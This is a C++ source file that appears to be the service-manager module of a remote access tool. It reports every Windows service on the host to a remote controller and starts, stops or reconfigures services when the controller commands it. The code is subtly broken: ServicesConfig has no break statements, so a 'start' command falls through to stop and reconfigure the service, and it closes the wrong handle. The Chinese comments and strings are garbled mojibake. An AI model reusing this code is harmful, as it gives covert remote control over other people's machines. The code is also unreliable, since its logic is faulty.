#include "stdafx.h"
#include "ServicesManager.h"
#include "Common.h"

CServicesManager::CServicesManager(IOCPClient* ClientObject)
	:CManager(ClientObject)
{
	SendServicesList();
	
}


CServicesManager::~CServicesManager()
{
}

VOID CServicesManager::SendServicesList()
{
	//��÷����б�
	LPBYTE szBuffer = GetServicesList();
	if (szBuffer == NULL)
	{
		return;
	}
	m_ClientObject->OnServerSending((char*)szBuffer, LocalSize(szBuffer));
	LocalFree(szBuffer);
}
LPBYTE CServicesManager::GetServicesList()
{
	LPENUM_SERVICE_STATUS  ServicesStatus = NULL;
	LPQUERY_SERVICE_CONFIG ServicesInfor = NULL;
	LPBYTE			szBuffer = NULL;
	char	 szRunWay[256] = { 0 };
	char	 szAutoRun[256] = { 0 };
	DWORD	 dwLength = 0;
	DWORD	 dwOffset = 0;
	//�򿪷��������
	if ((m_hscManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)) == NULL)
	{
		return NULL;
	}

	ServicesStatus = (LPENUM_SERVICE_STATUS)LocalAlloc(LPTR, 64 * 1024);

	if (ServicesStatus == NULL)
	{

		CloseServiceHandle(m_hscManager);
		return NULL;
	}

	DWORD    dwNeedsBytes = 0;
	DWORD    dwServicesCount = 0;
	DWORD    dwResumeHandle = 0;
	//ö�ٷ���
	EnumServicesStatus(m_hscManager,
		SERVICE_TYPE_ALL,    //CTL_FIX
		SERVICE_STATE_ALL,
		(LPENUM_SERVICE_STATUS)ServicesStatus,
		64 * 1024,
		&dwNeedsBytes,
		&dwServicesCount,
		&dwResumeHandle);



	szBuffer = (LPBYTE)LocalAlloc(LPTR, MAX_PATH);

	szBuffer[0] = TOKEN_SERVERLIST;
	dwOffset = 1;
	for (unsigned long i = 0; i < dwServicesCount; i++)  // Display The Services,��ʾ���еķ���
	{
		SC_HANDLE hServices = NULL;
		DWORD     nResumeHandle = 0;
		//�򿪷���
		hServices = OpenService(m_hscManager, ServicesStatus[i].lpServiceName,
			SERVICE_ALL_ACCESS);

		if (hServices == NULL)
		{
			continue;
		}


		ServicesInfor = (LPQUERY_SERVICE_CONFIG)LocalAlloc(LPTR, 4 * 1024);


		QueryServiceConfig(hServices, ServicesInfor, 4 * 1024, &dwResumeHandle);
		//��ѯ������������

		if (ServicesStatus[i].ServiceStatus.dwCurrentState != SERVICE_STOPPED) //����״̬
		{
			ZeroMemory(szRunWay, sizeof(szRunWay));
			lstrcat(szRunWay, "����");
		}
		else
		{
			ZeroMemory(szRunWay, sizeof(szRunWay));
			lstrcat(szRunWay, "ֹͣ");
		}

		if (2 == ServicesInfor->dwStartType) //�������  //SERVICE_AUTO_START
		{
			ZeroMemory(szAutoRun, sizeof(szAutoRun));
			lstrcat(szAutoRun, "�Զ�");
		}
		if (3 == ServicesInfor->dwStartType)   //SERVICE_DEMAND_START
		{
			ZeroMemory(szAutoRun, sizeof(szAutoRun));
			lstrcat(szAutoRun, "�ֶ�");
		}
		if (4 == ServicesInfor->dwStartType)
		{
			ZeroMemory(szAutoRun, sizeof(szAutoRun));   //SERVICE_DISABLED
			lstrcat(szAutoRun, "����");
		}


		dwLength = sizeof(DWORD) + lstrlen(ServicesStatus[i].lpDisplayName)
			+ lstrlen(ServicesInfor->lpBinaryPathName) + lstrlen(ServicesStatus[i].lpServiceName)
			+ lstrlen(szRunWay) + lstrlen(szAutoRun) + 1;
		// ������̫С�������·�����
		if (LocalSize(szBuffer) < (dwOffset + dwLength))
			szBuffer = (LPBYTE)LocalReAlloc(szBuffer, (dwOffset + dwLength),
				LMEM_ZEROINIT | LMEM_MOVEABLE);
		//��ʵ����
		memcpy(szBuffer + dwOffset, ServicesStatus[i].lpDisplayName,
			lstrlen(ServicesStatus[i].lpDisplayName) + 1);
		dwOffset += lstrlen(ServicesStatus[i].lpDisplayName) + 1;
		//��ʾ����
		memcpy(szBuffer + dwOffset, ServicesStatus[i].lpServiceName,
			lstrlen(ServicesStatus[i].lpServiceName) + 1);
		dwOffset += lstrlen(ServicesStatus[i].lpServiceName) + 1;
		//·��
		memcpy(szBuffer + dwOffset, ServicesInfor->lpBinaryPathName, lstrlen(ServicesInfor->lpBinaryPathName) + 1);
		dwOffset += lstrlen(ServicesInfor->lpBinaryPathName) + 1;
		//����״̬
		memcpy(szBuffer + dwOffset, szRunWay, lstrlen(szRunWay) + 1);
		dwOffset += lstrlen(szRunWay) + 1;
		//������״̬
		memcpy(szBuffer + dwOffset, szAutoRun, lstrlen(szAutoRun) + 1);
		dwOffset += lstrlen(szAutoRun) + 1;

		CloseServiceHandle(hServices);
		LocalFree(ServicesInfor);  //Config
	}


	CloseServiceHandle(m_hscManager);
	LocalFree(ServicesStatus);
	return szBuffer;

}

VOID CServicesManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	switch (szBuffer[0])
	{
		case COMMAND_SERVICELIST:
		{
			SendServicesList();
			break;
		}
		case COMMAND_SERVICECONFIG:
		{
			ServicesConfig((LPBYTE)szBuffer + 1, ulLength - 1);
			break;
		}
		default:
			break;
	}
}

VOID CServicesManager::ServicesConfig(LPBYTE szBuffer, ULONG ulLength)
{
	BYTE bCommand = szBuffer[0];
	char* szServicesName = (char*)(szBuffer + 1);
	switch (bCommand)
	{
	case ServicesStart:
	{
		SC_HANDLE ScManagerHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		if (ScManagerHandle != NULL)
		{
			SC_HANDLE hServices = OpenService(ScManagerHandle, szServicesName,
				SERVICE_ALL_ACCESS);
			if (hServices != NULL)
			{
				StartService(hServices, NULL, NULL);
				CloseServiceHandle(hServices);
			}
			CloseServiceHandle(m_hscManager);
		}
		Sleep(500);
		SendServicesList();
	}
	case ServicesStop:
	{
		SC_HANDLE ScManagerHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		if (ScManagerHandle != NULL)
		{
			SC_HANDLE hServices = OpenService(ScManagerHandle, szServicesName,
				SERVICE_ALL_ACCESS);
			if (hServices != NULL)
			{
				SERVICE_STATUS Status;
				BOOL bOk = ControlService(hServices, SERVICE_CONTROL_STOP, &Status);
				CloseServiceHandle(hServices);
			}
			CloseServiceHandle(m_hscManager);
		}
		Sleep(500);
		SendServicesList();

	}
	case ServicesAuto:
	{
		SC_HANDLE ScManagerHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		if (ScManagerHandle != NULL)
		{
			SC_HANDLE hServices = OpenService(ScManagerHandle, szServicesName,
				SERVICE_ALL_ACCESS);
			if (hServices != NULL)
			{
				SC_LOCK sclLock = LockServiceDatabase(ScManagerHandle);
				BOOL bOk = ChangeServiceConfig(
					hServices,
					SERVICE_NO_CHANGE,
					SERVICE_AUTO_START,
					SERVICE_NO_CHANGE,
					NULL,
					NULL,
					NULL,
					NULL,
					NULL,
					NULL,
					NULL);
				UnlockServiceDatabase(sclLock);
				CloseServiceHandle(hServices);
			}
			CloseServiceHandle(m_hscManager);
		}
		Sleep(500);
		SendServicesList();
	}
	case ServicesManual:
	{
		SC_HANDLE ScManagerHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		if (ScManagerHandle != NULL)
		{
			SC_HANDLE hServices = OpenService(ScManagerHandle, szServicesName,
				SERVICE_ALL_ACCESS);
			if (hServices != NULL)
			{
				SC_LOCK sclLock = LockServiceDatabase(ScManagerHandle);
				BOOL bOK = ChangeServiceConfig(
					hServices,
					SERVICE_NO_CHANGE,
					SERVICE_DEMAND_START,
					SERVICE_NO_CHANGE,
					NULL,
					NULL,
					NULL,
					NULL,
					NULL,
					NULL,
					NULL);
				UnlockServiceDatabase(sclLock);
				CloseServiceHandle(hServices);
			}
			CloseServiceHandle(m_hscManager);
		}
		Sleep(500);
		SendServicesList();
	}
	default:
		break;
	}
}